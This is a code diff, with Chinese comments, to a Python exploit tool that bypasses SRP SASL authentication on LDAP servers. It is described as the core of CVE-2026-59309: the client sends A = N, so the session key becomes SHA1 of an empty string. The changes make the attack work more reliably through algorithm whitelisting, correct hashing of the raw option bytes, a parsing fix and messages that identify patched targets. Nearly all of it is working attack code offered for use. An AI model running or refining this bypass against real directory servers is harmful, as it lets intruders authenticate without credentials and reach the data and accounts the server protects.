@@ -30,7 +30,9 @@ def srp_mpi(x):
 
 
 def srp_os(b):
-    return bytes([len(b) & 0xFF]) + b
+    if len(b) > 255:
+        raise ValueError("octet sequence too long for SRP buffer (%d)" % len(b))
+    return bytes([len(b)]) + b
 
 
 def srp_s(x):
@@ -101,35 +103,53 @@ def parse_server_options(L):
             so["mandatory"].add(low[10:])
         elif low.startswith("maxbuffersize="):
             try:
-                so["maxbuf"] = int(low[15:])
+                so["maxbuf"] = int(low[14:])
             except ValueError:
                 pass
     return so
 
 
+# 本工具实现的算法白名单（与 SRPLayer/aes128 的硬编码实现一致）。
+# srp.c 的 cipher_options 表序 DES 在 AES 之前，若照抄"第一个通告算法"
+# 会协商出本工具不支持的 confidentiality=des —— 必须白名单过滤。
+SUPPORTED_MDA = ("sha-1",)
+SUPPORTED_INTEGRITY = ("sha-1",)
+SUPPORTED_CONF = ("aes",)
+
+
 def decide_client_options(so, policy="auto"):
     """
     依据服务端通告决定客户端选项串（决定 M2 与安全层）。
-      auto  : 满足 mandatory，倾向最强层（AES + HMAC-SHA1 + replay）
-      plain : 空选项（无安全层，明文 LDAP）——服务端有 mandatory 时不可行
-      full  : 服务端通告什么就全开
+      auto / full : 满足 mandatory，从白名单中选可用组合；
+                    需要的层不在白名单内时返回 None（fail-fast，
+                    避免 bind 成功后安全层失步）
+      plain       : 空选项（无安全层，明文 LDAP）——服务端有 mandatory 时不可行
     服务端 ParseOptionString(isserver=1) 对未通告选项直接报错，
-    因此只下发服务端通告过的算法名。
+    因此只下发服务端通告过且本工具支持的算法名。
     """
     if policy == "plain":
         return "" if not so["mandatory"] else None
     parts = []
     if so["mda"]:
-        parts.append("mda=" + so["mda"][0])
+        mda = next((m for m in so["mda"] if m in SUPPORTED_MDA), None)
+        if mda is None:
+            return None
+        parts.append("mda=" + mda)
     want_conf = ("confidentiality" in so["mandatory"]) or bool(so["conf"])
     want_int = want_conf or ("integrity" in so["mandatory"]) or \
                ("replay_detection" in so["mandatory"]) or bool(so["integrity"])
-    if want_int and so["integrity"]:
-        parts.append("integrity=hmac-" + so["integrity"][0])
+    if want_int:
+        integ = next((i for i in so["integrity"] if i in SUPPORTED_INTEGRITY), None)
+        if integ is None:
+            return None
+        parts.append("integrity=hmac-" + integ)
         if so["replay"]:
             parts.append("replay_detection")
-    if want_conf and so["conf"]:
-        parts.append("confidentiality=" + so["conf"][0])
+    if want_conf:
+        conf = next((c for c in so["conf"] if c in SUPPORTED_CONF), None)
+        if conf is None:
+            return None
+        parts.append("confidentiality=" + conf)
     return ",".join(parts)
 
 
@@ -204,8 +224,8 @@ def srp_bypass_bind(conn, identity, policy="auto", log=lambda s: None):
     t1 = srp_frame(srp_s(ident) + srp_s(ident) + srp_s(b"") + srp_os(b""))
     code, diag, creds = _sasl_bind_round(conn, t1)
     if code != 14 or not creds:
-        # 回退：部分实现不接受首包携带初始响应
-        if code in (0, 2, None):
+        # 回退：部分实现不接受首包携带初始响应（code=2 protocolError / 未响应）
+        if code in (2, None):
             code, diag, creds = _sasl_bind_round(conn, None)
         if code != 14 or not creds:
             d = diag.decode("utf-8", "replace")
@@ -218,14 +238,19 @@ def srp_bypass_bind(conn, identity, policy="auto", log=lambda s: None):
     u = SRPUnpack(creds)
     u.c()
     N, g, salt, B = u.mpi(), u.mpi(), u.os(), u.mpi()
-    L = u.s().decode("utf-8", "replace")
+    L_raw = u.s()                       # 服务端原文 bytes —— M1/M2 哈希必须用它
+    L = L_raw.decode("utf-8", "replace")
     so = parse_server_options(L)
     log("[*] 服务端 SRP 参数: N=%d bit, g=%d, salt=%d B" % (N.bit_length(), g, len(salt)))
     log("[*] 服务端选项 L: %s" % L)
 
     opts_str = decide_client_options(so, policy)
     if opts_str is None:
-        return BypassResult(False, "服务端强制安全层且策略为 plain，请改用 auto/full")
+        return BypassResult(
+            False,
+            "无法协商出本工具支持的安全层组合（需要 mda=SHA-1 / integrity=HMAC-SHA-1 / "
+            "confidentiality=AES；服务端通告：%s）。若服务端未强制层可尝试 plain 策略。"
+            % (L or "(空)"))
 
     # --- CVE-2026-59309 核心：A = N ⇒ S = (A·v^u)^b mod N = 0 ⇒ K = SHA1("") ---
     A = N
@@ -240,7 +265,7 @@ def srp_bypass_bind(conn, identity, policy="auto", log=lambda s: None):
         + i2b(B)                              # bytes(B)
         + K
         + hashlib.sha1(ident).digest()       # H(I)（与服务端 text->userid 一致）
-        + hashlib.sha1(L.encode()).digest()   # H(L)（服务端选项串原文）
+        + hashlib.sha1(L_raw).digest()        # H(L)（服务端选项串原文 bytes）
     ).digest()
 
     cIV = secrets.token_bytes(16)
@@ -251,6 +276,11 @@ def srp_bypass_bind(conn, identity, policy="auto", log=lambda s: None):
         if "A mod N" in d or "Illegal value" in d:
             return BypassResult(False,
                                 "目标已修复：服务端存在 A ≡ 0 (mod N) 校验（%s）" % d)
+        if code == 2:
+            return BypassResult(
+                False,
+                "bind 被拒 code=2(protocolError)：%s —— 补丁版常不回显细节，"
+                "结合版本核对判断是否已修复" % d)
         return BypassResult(False,
                             "bind 失败 code=%s diag=%s（若 M1 不匹配：身份可能不存在"
                             "或服务端 MDA 非 SHA-1）" % (code, d))
